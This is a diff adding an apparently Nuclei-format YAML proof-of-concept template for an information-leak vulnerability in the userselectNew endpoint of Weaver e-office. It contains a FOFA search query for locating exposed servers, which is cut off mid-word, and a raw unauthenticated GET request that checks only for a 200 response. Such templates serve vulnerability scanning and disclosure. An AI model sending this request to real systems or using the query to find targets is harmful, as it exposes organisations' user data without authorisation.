@@ -1,0 +1,23 @@
+id: poc-zbv6x4fnss8iqg1k
+info:
+  name: 泛微e-office userselectNew存在信息泄漏漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zbv6x4fnss8iqg1k'
+  tags: info-leak,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: zbv6x4fnss8iqg1k
+    fofa: body="eoffice_loading_tip" || body="/eoffice10/client/web/" || ((header="general/login/index.php" || body="/general/login/view//images/updateLoad.gif" || (body="szFeatures" && body="eoffice") || heade
+http:
+- raw:
+  - 'GET /e-mobile/app/common/userselectNew/do.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2309.70 Safari/537.36'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
